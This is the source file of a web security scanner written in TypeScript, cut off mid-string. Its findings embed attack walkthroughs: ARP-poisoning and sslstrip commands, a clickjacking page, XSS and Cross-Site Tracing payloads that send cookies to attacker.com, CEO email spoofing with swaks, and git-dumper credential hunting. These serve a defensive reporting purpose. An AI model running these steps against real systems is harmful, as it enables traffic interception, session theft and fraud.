import https from "https";
import http from "http";
import dns from "dns/promises";
import { URL } from "url";
import { validateSensitiveFile, validateSqlInjection, validateXssReflection } from "./response-validator.js";
import { crawl, CrawlResult } from "./crawler.js";

export interface ScanFinding {
  id: string;
  category: "dns" | "ssl" | "headers" | "server_info" | "content_discovery" | "http_methods" | "sensitive_files" | "injection";
  title: string;
  severity: "info" | "low" | "medium" | "high" | "critical";
  status: "pass" | "fail" | "warning" | "info";
  description: string;
  detail?: string | null;
  recommendation?: string | null;
  execution_poc?: string | null;
}

export interface ScanSummary {
  total: number;
  critical: number;
  high: number;
  medium: number;
  low: number;
  info: number;
  passed: number;
}

export interface CrawlSummary {
  pagesVisited: number;
  urlsDiscovered: number;
  urlsWithParams: string[];
  urls: string[];
  jsFiles: string[];
  errors: string[];
}

export interface ScanResult {
  findings: ScanFinding[];
  summary: ScanSummary;
  responseTimeMs: number;
  serverInfo?: string | null;
  ipAddress?: string | null;
  sslValid?: boolean | null;
  sslExpiry?: string | null;
  scannedAt: string;
  crawlSummary?: CrawlSummary | null;
}

interface FetchResult {
  statusCode: number;
  headers: Record<string, string | string[] | undefined>;
  body: string;
  responseTimeMs: number;
  sslValid?: boolean;
  sslExpiry?: string | null;
}

function fetchUrl(targetUrl: string, method = "GET", timeout = 10000): Promise<FetchResult> {
  return new Promise((resolve, reject) => {
    const parsed = new URL(targetUrl);
    const isHttps = parsed.protocol === "https:";
    const lib = isHttps ? https : http;
    const start = Date.now();

    const options: https.RequestOptions = {
      method,
      host: parsed.hostname,
      port: parsed.port || (isHttps ? 443 : 80),
      path: parsed.pathname + parsed.search,
      headers: {
        "User-Agent": "Mozilla/5.0 (compatible; SecurityScanner/1.0)",
        Accept: "text/html,application/xhtml+xml,*/*",
      },
      rejectUnauthorized: false,
    };

    const req = lib.request(options, (res) => {
      let body = "";
      res.on("data", (chunk) => {
        if (body.length < 50000) body += chunk;
      });
      res.on("end", () => {
        const headers: Record<string, string | string[] | undefined> = {};
        for (const [k, v] of Object.entries(res.headers)) {
          headers[k.toLowerCase()] = v;
        }

        let sslValid: boolean | undefined;
        let sslExpiry: string | null = null;

        if (isHttps) {
          const socket = (res.socket as any);
          try {
            const cert = socket?.getPeerCertificate?.();
            if (cert && cert.valid_to) {
              sslExpiry = cert.valid_to;
              sslValid = new Date(cert.valid_to) > new Date();
            } else {
              sslValid = true;
            }
          } catch {
            sslValid = true;
          }
        }

        resolve({
          statusCode: res.statusCode ?? 0,
          headers,
          body,
          responseTimeMs: Date.now() - start,
          sslValid,
          sslExpiry,
        });
      });
    });

    req.setTimeout(timeout, () => {
      req.destroy();
      reject(new Error("Request timed out"));
    });

    req.on("error", reject);
    req.end();
  });
}

function headerStr(val: string | string[] | undefined): string | undefined {
  if (!val) return undefined;
  if (Array.isArray(val)) return val.join(", ");
  return val;
}

function checkSecurityHeaders(headers: Record<string, string | string[] | undefined>): ScanFinding[] {
  const findings: ScanFinding[] = [];

  const hsts = headerStr(headers["strict-transport-security"]);
  if (!hsts) {
    findings.push({
      id: "missing-hsts",
      category: "headers",
      title: "Missing Strict-Transport-Security (HSTS)",
      severity: "medium",
      status: "fail",
      description: "The Strict-Transport-Security header is not set. Without HSTS, browsers may connect over HTTP, exposing users to downgrade attacks.",
      recommendation: 'Set: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload',
      execution_poc: `# Step 1: Confirm the header is absent
curl -sI https://TARGET_URL | grep -i strict-transport
# Expected result: (no output) — header is missing

# Step 2: Downgrade attack with SSLStrip (requires network position)
# Attacker on same LAN runs:
pip install sslstrip
sslstrip -l 8080
arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP   # ARP poisoning

# Step 3: Outcome
# All HTTPS links served as HTTP to the victim
# Browser silently loads http:// version — no padlock warning
# Credentials, cookies, and tokens transmitted in plaintext
# Attacker captures them with: tcpdump -i eth0 -A port 80 | grep -i "password\\|session"

# Step 4: Verify fix
curl -sI https://TARGET_URL | grep -i strict-transport
# Expected after fix: strict-transport-security: max-age=31536000; includeSubDomains`,
    });
  } else {
    findings.push({
      id: "hsts-present",
      category: "headers",
      title: "Strict-Transport-Security (HSTS)",
      severity: "info",
      status: "pass",
      description: "HSTS header is configured.",
      detail: hsts,
    });
  }

  const xfo = headerStr(headers["x-frame-options"]);
  if (!xfo) {
    findings.push({
      id: "missing-xfo",
      category: "headers",
      title: "Missing X-Frame-Options",
      severity: "medium",
      status: "fail",
      description: "The X-Frame-Options header is missing. This may expose the site to clickjacking attacks where it is embedded in a malicious iframe.",
      recommendation: "Set: X-Frame-Options: DENY or SAMEORIGIN",
      execution_poc: `# Step 1: Confirm header is absent
curl -sI https://TARGET_URL | grep -i x-frame-options
# Expected: (no output)

# Step 2: Clickjacking PoC — save this as attack.html and open in a browser
# -----------------------------------------------------------------------
# <html><body style="background:#fff">
#   <h2>You have won a prize! Click the button:</h2>
#   <!-- Invisible iframe overlaid on top of the fake button -->
#   <iframe src="https://TARGET_URL/account/settings"
#           style="opacity:0.01; position:absolute; top:60px; left:0;
#                  width:800px; height:400px; z-index:99">
#   </iframe>
#   <button style="position:absolute; top:100px; left:150px;
#                  padding:20px; font-size:18px; z-index:1">
#     CLAIM PRIZE
#   </button>
# </body></html>
# -----------------------------------------------------------------------

# Step 3: Outcome
# Victim thinks they are clicking "Claim Prize"
# They are actually clicking on a button inside the TARGET_URL page
# (e.g. "Confirm transfer", "Delete account", "Approve payment")
# Their authenticated session performs the action with no awareness

# Step 4: Advanced — UI redress with CSS position manipulation
# Use browser DevTools to measure exact pixel coordinates of target button
# then position the iframe to align it precisely`,
    });
  } else {
    findings.push({
      id: "xfo-present",
      category: "headers",
      title: "X-Frame-Options",
      severity: "info",
      status: "pass",
      description: "Clickjacking protection header is set.",
      detail: xfo,
    });
  }

  const csp = headerStr(headers["content-security-policy"]);
  if (!csp) {
    findings.push({
      id: "missing-csp",
      category: "headers",
      title: "Missing Content-Security-Policy",
      severity: "high",
      status: "fail",
      description: "No Content-Security-Policy header found. CSP is the primary defense against XSS (Cross-Site Scripting) attacks.",
      recommendation: "Implement a strict CSP. Start with: Content-Security-Policy: default-src 'self'",
      execution_poc: `# Step 1: Confirm header is absent
curl -sI https://TARGET_URL | grep -i content-security-policy
# Expected: (no output)

# Step 2: Without CSP, any injected script executes freely in the browser
# If the site also has an XSS vulnerability (see Reflected XSS finding):
# Inject this payload into a vulnerable input field or URL parameter:
#
# https://TARGET_URL/search?q=<script>
#   fetch('https://attacker.com/exfil?d='+btoa(document.cookie))
# </script>

# Step 3: Data exfiltration outcome
# Attacker receives the victim's cookies at https://attacker.com/exfil
# attacker.com access log shows: GET /exfil?d=c2Vzc2lvbj1hYmMxMjM=
# base64 decode: session=abc123

# Step 4: Without CSP, attacker can also load remote scripts
# <script src="https://attacker.com/keylogger.js"></script>
# This captures every keystroke — passwords, credit card numbers, etc.

# Step 5: Burp Suite test
# Proxy > Intercept > send request > Repeater
# Check Response Headers tab — CSP should appear there if set`,
    });
  } else {
    const unsafeInline = csp.includes("'unsafe-inline'");
    const unsafeEval = csp.includes("'unsafe-eval'");
    if (unsafeInline || unsafeEval) {
      findings.push({
        id: "weak-csp",
        category: "headers",
        title: "Weak Content-Security-Policy",
        severity: "medium",
        status: "warning",
        description: `CSP is present but uses ${[unsafeInline && "'unsafe-inline'", unsafeEval && "'unsafe-eval'"].filter(Boolean).join(" and ")}, which weakens XSS protection.`,
        detail: csp.slice(0, 200),
        recommendation: "Remove 'unsafe-inline' and 'unsafe-eval' directives and use nonces or hashes instead.",
      });
    } else {
      findings.push({
        id: "csp-present",
        category: "headers",
        title: "Content-Security-Policy",
        severity: "info",
        status: "pass",
        description: "CSP header is configured.",
        detail: csp.slice(0, 200),
      });
    }
  }

  const xcto = headerStr(headers["x-content-type-options"]);
  if (!xcto || xcto.toLowerCase() !== "nosniff") {
    findings.push({
      id: "missing-xcto",
      category: "headers",
      title: "Missing X-Content-Type-Options",
      severity: "low",
      status: "fail",
      description: "X-Content-Type-Options: nosniff is not set. Without it, browsers may MIME-sniff responses away from declared content types.",
      recommendation: "Set: X-Content-Type-Options: nosniff",
      execution_poc: `# Step 1: Confirm header is absent
curl -sI https://TARGET_URL | grep -i x-content-type-options
# Expected: (no output)

# Step 2: MIME-sniffing attack — upload a polyglot file
# Create a file that is valid JPEG but contains JavaScript:
# (binary JPEG header) + <script>alert(document.domain)</script>
# Upload to profile picture endpoint, get a public URL like:
# https://TARGET_URL/uploads/photo.jpg

# Step 3: Serve the JPEG URL inside a <script> tag
# <script src="https://TARGET_URL/uploads/photo.jpg"></script>
# Without nosniff, IE/old Edge sniffs the content as JavaScript and EXECUTES it

# Step 4: Verify with curl
curl -sI https://TARGET_URL/uploads/photo.jpg | grep -i content-type
# Content-Type: image/jpeg  (but browser may still sniff and execute JS)

# Modern Chrome/Firefox are largely resistant, but IE11 and some
# enterprise browsers are still vulnerable to this attack vector`,
    });
  } else {
    findings.push({
      id: "xcto-present",
      category: "headers",
      title: "X-Content-Type-Options",
      severity: "info",
      status: "pass",
      description: "MIME-type sniffing protection is enabled.",
    });
  }

  const rp = headerStr(headers["referrer-policy"]);
  if (!rp) {
    findings.push({
      id: "missing-rp",
      category: "headers",
      title: "Missing Referrer-Policy",
      severity: "low",
      status: "warning",
      description: "No Referrer-Policy header set. Without it, the browser's default may leak full URLs in the Referer header to third parties.",
      recommendation: "Set: Referrer-Policy: strict-origin-when-cross-origin",
      execution_poc: `# Step 1: Confirm header is absent
curl -sI https://TARGET_URL | grep -i referrer-policy
# Expected: (no output)

# Step 2: Observe Referer leakage using Burp Suite
# Open Burp > Proxy > Intercept
# Visit: https://TARGET_URL/account/reset-password?token=SECRET_TOKEN_ABC123
# Click any external link on that page (e.g. a social media link)
# In Burp, intercept the outgoing request — check the Referer header:
# Referer: https://TARGET_URL/account/reset-password?token=SECRET_TOKEN_ABC123
# The full URL including the password-reset token is leaked to the third party!

# Step 3: With curl, simulate a cross-origin request with Referer
curl -sI https://third-party.com/some-resource \
     -H "Referer: https://TARGET_URL/private-page?sessionid=xyz"

# Step 4: Outcome
# Password reset tokens, session identifiers, and private page paths
# can be harvested from server access logs of any third-party resource
# (analytics scripts, CDNs, embedded fonts, tracking pixels)`,
    });
  } else {
    findings.push({
      id: "rp-present",
      category: "headers",
      title: "Referrer-Policy",
      severity: "info",
      status: "pass",
      description: "Referrer-Policy is configured.",
      detail: rp,
    });
  }

  const pp = headerStr(headers["permissions-policy"]) || headerStr(headers["feature-policy"]);
  if (!pp) {
    findings.push({
      id: "missing-pp",
      category: "headers",
      title: "Missing Permissions-Policy",
      severity: "info",
      status: "info",
      description: "Permissions-Policy (formerly Feature-Policy) header is not set. This header lets you control browser feature access (camera, microphone, geolocation).",
      recommendation: "Consider setting: Permissions-Policy: camera=(), microphone=(), geolocation=()",
    });
  } else {
    findings.push({
      id: "pp-present",
      category: "headers",
      title: "Permissions-Policy",
      severity: "info",
      status: "pass",
      description: "Permissions-Policy header is configured.",
      detail: pp.slice(0, 150),
    });
  }

  return findings;
}

function checkServerInfo(headers: Record<string, string | string[] | undefined>): ScanFinding[] {
  const findings: ScanFinding[] = [];

  const server = headerStr(headers["server"]);
  if (server) {
    const exposesVersion = /[\d.]{2,}/.test(server) || /nginx\/|apache\/|iis\/|express\//i.test(server);
    findings.push({
      id: "server-header",
      category: "server_info",
      title: exposesVersion ? "Server Version Disclosure" : "Server Header Present",
      severity: exposesVersion ? "low" : "info",
      status: exposesVersion ? "warning" : "info",
      description: exposesVersion
        ? "The Server header reveals the web server software and version. Attackers use this to identify known vulnerabilities for that version."
        : "The Server header is present but does not disclose version information.",
      detail: server,
      recommendation: exposesVersion
        ? "Configure your web server to remove or obfuscate the Server header. Remove version information."
        : undefined,
      execution_poc: exposesVersion ? `# Step 1: Extract server banner
curl -sI https://TARGET_URL | grep -i server
# Example output: Server: nginx/1.18.0

# Step 2: Search for CVEs against the identified version
searchsploit nginx 1.18
# or visit: https://www.cvedetails.com/version-list/10048/12926/1/Nginx-Nginx.html

# Step 3: Check NVD for known vulnerabilities
curl -s "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=nginx+1.18" \
     | python3 -m json.tool | grep -i "cveid\\|description"

# Step 4: Outcome
# Attacker identifies an unpatched CVE (e.g. CVE-2021-23017 — nginx DNSSEC buffer overflow)
# Downloads a public exploit: searchsploit -m 49812
# Executes against the target with the known version` : undefined,
    });
  } else {
    findings.push({
      id: "server-hidden",
      category: "server_info",
      title: "Server Header Hidden",
      severity: "info",
      status: "pass",
      description: "Server header is not present, preventing software/version disclosure.",
    });
  }

  const xpow = headerStr(headers["x-powered-by"]);
  if (xpow) {
    findings.push({
      id: "x-powered-by",
      category: "server_info",
      title: "X-Powered-By Header Exposed",
      severity: "low",
      status: "warning",
      description: "The X-Powered-By header reveals the server-side technology (e.g., PHP, Express, ASP.NET), helping attackers target known vulnerabilities.",
      detail: xpow,
      recommendation: "Remove the X-Powered-By header. In Express: app.disable('x-powered-by'). In PHP: expose_php = Off",
      execution_poc: `# Step 1: Confirm the header is present
curl -sI https://TARGET_URL | grep -i x-powered-by
# Example output: X-Powered-By: PHP/7.2.0

# Step 2: Enumerate CVEs for the disclosed technology
searchsploit php 7.2
# or: https://www.cvedetails.com/vulnerability-list/vendor_id-74/product_id-128/version_id-232288/PHP-PHP-7.2.0.html

# Step 3: For outdated PHP — attempt type-juggling or deserialization exploits
# PHP 7.2 is EOL (end-of-life) — no security patches since Nov 2020
# Known critical: CVE-2019-11043 (nginx + php-fpm RCE)
curl -v "https://TARGET_URL/index.php?a=AAAAAA....(250+ chars)"
# Returns 502? May be vulnerable to memory corruption

# Step 4: For Express disclosure
# X-Powered-By: Express → indicates Node.js
# Probe for common Node.js vulnerabilities or prototype pollution`,
    });
  } else {
    findings.push({
      id: "x-powered-by-hidden",
      category: "server_info",
      title: "X-Powered-By Hidden",
      severity: "info",
      status: "pass",
      description: "X-Powered-By header is not present.",
    });
  }

  const via = headerStr(headers["via"]);
  if (via) {
    findings.push({
      id: "via-header",
      category: "server_info",
      title: "Via Header Exposes Proxy Info",
      severity: "info",
      status: "info",
      description: "The Via header is present, indicating a proxy or load balancer and its version.",
      detail: via,
    });
  }

  return findings;
}

async function checkDns(hostname: string): Promise<ScanFinding[]> {
  const findings: ScanFinding[] = [];

  try {
    const addresses = await dns.resolve4(hostname);
    findings.push({
      id: "dns-a-records",
      category: "dns",
      title: "DNS A Records",
      severity: "info",
      status: "info",
      description: `Found ${addresses.length} IPv4 address(es) for this hostname.`,
      detail: addresses.join(", "),
    });
  } catch {
    findings.push({
      id: "dns-no-a",
      category: "dns",
      title: "No DNS A Records Found",
      severity: "high",
      status: "fail",
      description: "Could not resolve IPv4 address for this hostname. The domain may not exist or DNS is misconfigured.",
    });
  }

  try {
    const mx = await dns.resolveMx(hostname);
    if (mx.length > 0) {
      findings.push({
        id: "dns-mx",
        category: "dns",
        title: "Mail Servers (MX Records)",
        severity: "info",
        status: "info",
        description: `Found ${mx.length} MX record(s). Email infrastructure is publicly discoverable.`,
        detail: mx.map((r) => `${r.exchange} (priority: ${r.priority})`).join(", "),
      });
    }
  } catch {}

  try {
    const ns = await dns.resolveNs(hostname);
    if (ns.length > 0) {
      findings.push({
        id: "dns-ns",
        category: "dns",
        title: "Nameservers (NS Records)",
        severity: "info",
        status: "info",
        description: `Domain uses ${ns.length} nameserver(s). Nameserver software/provider is publicly discoverable.`,
        detail: ns.join(", "),
      });
    }
  } catch {}

  try {
    const txt = await dns.resolveTxt(hostname);
    const hasSPF = txt.some((r) => r.join("").toLowerCase().startsWith("v=spf1"));
    const hasDMARC = txt.some((r) => r.join("").toLowerCase().includes("v=dmarc1"));
    if (hasSPF) {
      findings.push({
        id: "spf-present",
        category: "dns",
        title: "SPF Record Present",
        severity: "info",
        status: "pass",
        description: "An SPF (Sender Policy Framework) record exists, helping prevent email spoofing.",
        detail: txt.find((r) => r.join("").toLowerCase().startsWith("v=spf1"))?.join(""),
      });
    } else {
      findings.push({
        id: "spf-missing",
        category: "dns",
        title: "Missing SPF Record",
        severity: "medium",
        status: "warning",
        description: "No SPF record found. Without SPF, malicious actors can send email impersonating your domain.",
        recommendation: "Add a TXT record: v=spf1 include:your-mail-provider.com ~all",
        execution_poc: `# Step 1: Confirm SPF is absent
dig TXT TARGET_DOMAIN | grep spf
# Expected: (no output) — no SPF record

# Step 2: Send a spoofed email using swaks (SMTP Swiss Army Knife)
# Install: sudo apt install swaks
swaks --to victim@company.com \\
      --from ceo@TARGET_DOMAIN \\
      --server mail.attacker.com \\
      --header "Subject: Urgent: Wire transfer required" \\
      --body "Hi, please process this payment immediately."

# Step 3: Outcome
# Email arrives appearing to be from ceo@TARGET_DOMAIN
# Many mail clients show only the display name, hiding the actual server
# Recipient is deceived into acting on a fraudulent email (phishing/BEC)

# Step 4: Verify via MXToolbox
# https://mxtoolbox.com/spf.aspx?domain=TARGET_DOMAIN
# Result will confirm: "SPF Record Not Found"`,
      });
    }

    if (!hasDMARC) {
      findings.push({
        id: "dmarc-missing",
        category: "dns",
        title: "Missing DMARC Record",
        severity: "medium",
        status: "warning",
        description: "No DMARC policy found. DMARC protects against email spoofing by specifying what to do with unauthenticated emails.",
        recommendation: "Add a TXT record on _dmarc.yourdomain.com: v=DMARC1; p=quarantine; rua=mailto:dmarc@yourdomain.com",
        execution_poc: `# Step 1: Confirm DMARC is absent
dig TXT _dmarc.TARGET_DOMAIN
# Expected: (no output)

# Step 2: Without DMARC, receiving mail servers have no policy to enforce
# Even if SPF exists, a missing DMARC means alignment is not enforced
# Combine with SPF spoofing attack (see Missing SPF finding)

# Step 3: Check alignment failure with dmarcian or mail-tester
# Send a test email and check: https://www.mail-tester.com/
# Score will show "DMARC policy not enabled"

# Step 4: Impact — Business Email Compromise (BEC)
# Attacker spoofs billing@TARGET_DOMAIN to accounts payable team
# No SPF+DMARC = email passes spam filters in many configurations
# FBI IC3 report: BEC scams cost $2.7B+ annually`,
      });
    } else {
      findings.push({
        id: "dmarc-present",
        category: "dns",
        title: "DMARC Policy Present",
        severity: "info",
        status: "pass",
        description: "DMARC policy is configured, protecting against email spoofing.",
      });
    }
  } catch {}

  return findings;
}

async function checkSsl(url: string, fetchResult: FetchResult): Promise<ScanFinding[]> {
  const findings: ScanFinding[] = [];
  const parsed = new URL(url);

  if (parsed.protocol === "http:") {
    findings.push({
      id: "no-https",
      category: "ssl",
      title: "Site Not Using HTTPS",
      severity: "critical",
      status: "fail",
      description: "The target URL uses plain HTTP, meaning all data is transmitted unencrypted. Credentials, session cookies, and personal data are exposed.",
      recommendation: "Migrate to HTTPS. Obtain a free TLS certificate from Let's Encrypt.",
      execution_poc: `# Step 1: Confirm the site runs HTTP only
curl -sI http://TARGET_URL | head -5
# Response will not redirect to https://

# Step 2: Passive traffic interception (same LAN / coffee shop wifi)
# Attacker runs Wireshark or tcpdump:
tcpdump -i eth0 -A host TARGET_IP and port 80 | grep -i "password\\|token\\|session\\|cookie"

# Step 3: Active man-in-the-middle with mitmproxy
mitmproxy --mode transparent --listen-port 8080
# Route victim's traffic through attacker machine (ARP poisoning):
arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP
# mitmproxy captures ALL plaintext HTTP traffic including credentials

# Step 4: Example captured credential
# POST /login HTTP/1.1
# username=admin&password=hunter2
# Session cookie in plaintext in subsequent requests

# Step 5: Fix — obtain free certificate
certbot --nginx -d TARGET_DOMAIN
# Then redirect all HTTP to HTTPS:
# return 301 https://$host$request_uri;`,
    });
    return findings;
  }

  if (fetchResult.sslValid !== undefined) {
    if (fetchResult.sslValid) {
      findings.push({
        id: "ssl-valid",
        category: "ssl",
        title: "Valid SSL/TLS Certificate",
        severity: "info",
        status: "pass",
        description: "The SSL/TLS certificate is valid and not expired.",
        detail: fetchResult.sslExpiry ? `Expires: ${fetchResult.sslExpiry}` : undefined,
      });

      if (fetchResult.sslExpiry) {
        const expiry = new Date(fetchResult.sslExpiry);
        const daysLeft = Math.floor((expiry.getTime() - Date.now()) / (1000 * 60 * 60 * 24));
        if (daysLeft < 30) {
          findings.push({
            id: "ssl-expiry-soon",
            category: "ssl",
            title: "SSL Certificate Expiring Soon",
            severity: daysLeft < 7 ? "critical" : "high",
            status: "warning",
            description: `SSL certificate expires in ${daysLeft} day(s). If it expires, browsers will show security warnings and block access.`,
            detail: `Expiry: ${fetchResult.sslExpiry}`,
            recommendation: "Renew the certificate immediately. Consider enabling auto-renewal.",
          });
        }
      }
    } else {
      findings.push({
        id: "ssl-invalid",
        category: "ssl",
        title: "Invalid or Expired SSL Certificate",
        severity: "critical",
        status: "fail",
        description: "The SSL certificate is invalid or expired. Browsers will block access and users will see security warnings.",
        detail: fetchResult.sslExpiry ? `Certificate expiry: ${fetchResult.sslExpiry}` : undefined,
        recommendation: "Renew your SSL certificate immediately.",
        execution_poc: `# Step 1: Inspect the certificate details
openssl s_client -connect TARGET_DOMAIN:443 -servername TARGET_DOMAIN 2>/dev/null \\
  | openssl x509 -noout -dates -subject -issuer
# Output shows: notAfter=<past date> → certificate is expired

# Step 2: Confirm with curl
curl -v https://TARGET_URL 2>&1 | grep -i "certificate\\|SSL\\|expired"
# curl: (60) SSL certificate problem: certificate has expired

# Step 3: Impact on users
# Chrome/Firefox shows: "Your connection is not private" (ERR_CERT_DATE_INVALID)
# Users who click through "Advanced > Proceed" are susceptible to MITM
# Attacker can present their own certificate (since trust is already broken)

# Step 4: Attacker performs SSL stripping
# Since users click through the warning, the connection is downgraded to HTTP
# Attacker intercepts with mitmproxy and captures credentials in plaintext

# Step 5: Renew immediately
certbot renew --force-renewal
# For Let's Encrypt auto-renewal: systemctl enable certbot.timer`,
      });
    }
  }

  return findings;
}

async function checkContentDiscovery(baseUrl: string): Promise<ScanFinding[]> {
  const findings: ScanFinding[] = [];
  const parsed = new URL(baseUrl);
  const base = `${parsed.protocol}//${parsed.host}`;

  const paths = [
    { path: "/robots.txt", name: "robots.txt" },
    { path: "/sitemap.xml", name: "sitemap.xml" },
    { path: "/.well-known/security.txt", name: "security.txt" },
  ];

  for (const { path, name } of paths) {
    try {
      const result = await fetchUrl(base + path, "GET", 5000);
      if (result.statusCode === 200) {
        if (name === "robots.txt") {
          const disallowed = (result.body.match(/Disallow:.+/g) || []).map((l) => l.replace("Disallow:", "").trim()).filter(Boolean);
          findings.push({
            id: "robots-txt",
            category: "content_discovery",
            title: "robots.txt Found",
            severity: "info",
            status: "info",
            description: `robots.txt is accessible and lists ${disallowed.length} disallowed path(s). This file reveals directory structure to search engines and attackers.`,
            detail: disallowed.length ? `Disallowed paths: ${disallowed.slice(0, 5).join(", ")}` : undefined,
          });
        } else if (name === "sitemap.xml") {
          findings.push({
            id: "sitemap-xml",
            category: "content_discovery",
            title: "sitemap.xml Found",
            severity: "info",
            status: "info",
            description: "sitemap.xml is publicly accessible, exposing the full URL structure of the website.",
          });
        } else if (name === "security.txt") {
          findings.push({
            id: "security-txt",
            category: "content_discovery",
            title: "security.txt Present",
            severity: "info",
            status: "pass",
            description: "A security.txt file is present, providing contact information for security researchers to report vulnerabilities.",
          });
        }
      } else if (name === "security.txt") {
        findings.push({
          id: "security-txt-missing",
          category: "content_discovery",
          title: "No security.txt Found",
          severity: "info",
          status: "info",
          description: "No security.txt file found. This optional file (RFC 9116) provides a standard way for security researchers to report vulnerabilities.",
          recommendation: "Create /.well-known/security.txt with contact and policy information.",
        });
      }
    } catch {}
  }

  return findings;
}

async function checkHttpMethods(baseUrl: string): Promise<ScanFinding[]> {
  const findings: ScanFinding[] = [];

  const dangerousMethods = ["TRACE", "OPTIONS"];

  for (const method of dangerousMethods) {
    try {
      const result = await fetchUrl(baseUrl, method, 5000);
      if (method === "TRACE" && result.statusCode === 200) {
        findings.push({
          id: "trace-enabled",
          category: "http_methods",
          title: "HTTP TRACE Method Enabled",
          severity: "medium",
          status: "fail",
          description: "The TRACE method is enabled. It can be used in Cross-Site Tracing (XST) attacks to steal cookies, bypassing HttpOnly protection.",
          recommendation: "Disable the TRACE method on your web server.",
          execution_poc: `# Step 1: Confirm TRACE is enabled
curl -X TRACE https://TARGET_URL -v 2>&1 | grep -A 20 "< HTTP"
# Response body will echo back the full request — including all headers!

# Step 2: Cross-Site Tracing (XST) attack
# Even HttpOnly cookies can be stolen if TRACE is enabled + XSS exists:
# Inject this script via XSS vulnerability:
#
# <script>
#   var xhr = new XMLHttpRequest();
#   xhr.open('TRACE', 'https://TARGET_URL/', false);
#   xhr.send('');
#   // Response body contains all request headers including HttpOnly cookies
#   fetch('https://attacker.com/steal?d=' + btoa(xhr.responseText));
# </script>

# Step 3: Outcome
# The TRACE response echoes: Cookie: session=ABC123; HttpOnly
# This bypasses HttpOnly — the flag prevents JS document.cookie access
# but TRACE reflection leaks it through the response body

# Step 4: Disable in nginx
# server { ... }
# Add inside server block: if ($request_method = TRACE) { return 405; }
# Apache: TraceEnable Off`,
        });
      } else if (method === "OPTIONS") {
        const allow = headerStr(result.headers["allow"]) || headerStr(result.headers["public"]);
        if (allow) {
          const allowedMethods = allow.toUpperCase();
          const hasDelete = allowedMethods.includes("DELETE");
          const hasPut = allowedMethods.includes("PUT");
          findings.push({
            id: "options-methods",
            category: "http_methods",
            title: "HTTP Methods via OPTIONS",
            severity: hasDelete || hasPut ? "low" : "info",
            status: hasDelete || hasPut ? "warning" : "info",
            description: `Server advertises the following HTTP methods: ${allow}`,
            detail: allow,
            recommendation: hasDelete || hasPut
              ? "Verify that DELETE and PUT methods are intentionally exposed and protected by authentication."
              : undefined,
          });
        }
      }
    } catch {}
  }

  if (!findings.some((f) => f.id === "trace-enabled")) {
    findings.push({
      id: "trace-disabled",
      category: "http_methods",
      title: "HTTP TRACE Method Disabled",
      severity: "info",
      status: "pass",
      description: "TRACE method is not enabled, preventing Cross-Site Tracing attacks.",
    });
  }

  return findings;
}

// ── Sensitive Files ──────────────────────────────────────────────────────────

const SENSITIVE_PATHS: Array<{ path: string; label: string; severity: ScanFinding["severity"]; why: string }> = [
  { path: "/.git/HEAD",         label: ".git/HEAD",       severity: "critical", why: "Git repository metadata is publicly accessible, potentially exposing source code history, credentials, and internal logic." },
  { path: "/.git/config",       label: ".git/config",     severity: "critical", why: "Git config can reveal remote URLs, author details, and repository structure." },
  { path: "/.env",              label: ".env",            severity: "critical", why: "Environment file may contain database credentials, API keys, and other secrets in plain text." },
  { path: "/.env.local",        label: ".env.local",      severity: "critical", why: "Local environment override file may contain secrets not intended for production." },
  { path: "/.env.production",   label: ".env.production", severity: "critical", why: "Production environment file may expose database credentials and API keys." },
  { path: "/wp-config.php",     label: "wp-config.php",   severity: "critical", why: "WordPress configuration file contains database host, name, username, and password." },
  { path: "/.htpasswd",         label: ".htpasswd",       severity: "high",     why: "Exposes hashed credentials for HTTP Basic Authentication — attackers can attempt offline dictionary attacks." },
  { path: "/.htaccess",         label: ".htaccess",       severity: "medium",   why: "Reveals server configuration rules such as rewrites, redirects, access restrictions, and custom error pages." },
  { path: "/web.config",        label: "web.config",      severity: "high",     why: "IIS configuration file can contain connection strings, authentication settings, and custom error details." },
  { path: "/phpinfo.php",       label: "phpinfo.php",     severity: "high",     why: "PHP info page exposes server configuration, loaded modules, environment variables, and PHP version." },
  { path: "/server-status",     label: "server-status",   severity: "medium",   why: "Apache server-status page discloses active requests, clients, and server uptime." },
  { path: "/server-info",       label: "server-info",     severity: "medium",   why: "Apache server-info page reveals installed modules and configuration directives." },
  { path: "/config.php",        label: "config.php",      severity: "high",     why: "Application config file may expose database credentials and internal settings." },
  { path: "/config.yml",        label: "config.yml",      severity: "high",     why: "YAML config file may contain secrets, database credentials, or service API keys." },
  { path: "/config.json",       label: "config.json",     severity: "medium",   why: "JSON configuration file may reveal application settings and internal structure." },
  { path: "/backup.sql",        label: "backup.sql",      severity: "critical", why: "A database dump file is directly accessible — contains all table structure and data." },
  { path: "/dump.sql",          label: "dump.sql",        severity: "critical", why: "A database dump file is directly accessible — contains all table structure and data." },
  { path: "/database.sql",      label: "database.sql",    severity: "critical", why: "A database export file is directly accessible." },
  { path: "/.DS_Store",         label: ".DS_Store",       severity: "low",      why: "macOS metadata file reveals directory structure and file names on the server." },
  { path: "/crossdomain.xml",   label: "crossdomain.xml", severity: "low",      why: "Flash cross-domain policy file — if misconfigured (allow-access-from domain='*'), allows any Flash app to read responses." },
  { path: "/elmah.axd",         label: "elmah.axd",       severity: "high",     why: "ASP.NET error log viewer is publicly accessible, exposing stack traces, server paths, and potential credentials." },
  { path: "/trace.axd",         label: "trace.axd",       severity: "medium",   why: "ASP.NET trace viewer exposes request/response details and internal data flows." },
];

function getSensitiveFilePoc(path: string, label: string): string {
  if (path.startsWith("/.git")) {
    return `# Step 1: Confirm the git repo is exposed
curl -s https://TARGET_URL/.git/HEAD
# Expected output: ref: refs/heads/main   ← git repo metadata is public!

# Step 2: Dump the full repository using git-dumper
pip install git-dumper
git-dumper https://TARGET_URL/.git/ ./stolen-repo

# Step 3: Inspect the stolen source code
cd stolen-repo
git log --oneline    # commit history
grep -r "password\\|secret\\|api_key\\|token" .   # hunt for credentials
cat .env             # environment variables often committed by accident

# Step 4: Outcome
# Full source code, commit history, database credentials, API keys, and
# internal architecture details are now in the attacker's hands
# Use discovered credentials to access databases, cloud accounts, etc.`;
  }
  if (path === "/.env" || path === "/.env.local" || path === "/.env.production") {
    return `# Step 1: Fetch the file directly
curl -s https://TARGET_URL${path}
# Expected output:
# DB_HOST=db.internal.com
# DB_USER=appuser
# DB_PASSWORD=supersecret123
# STRIPE_SECRET_KEY=sk_live_...
# JWT_SECRET=...

# Step 2: Use the leaked credentials
# Database: psql -h db.internal.com -U appuser -d production
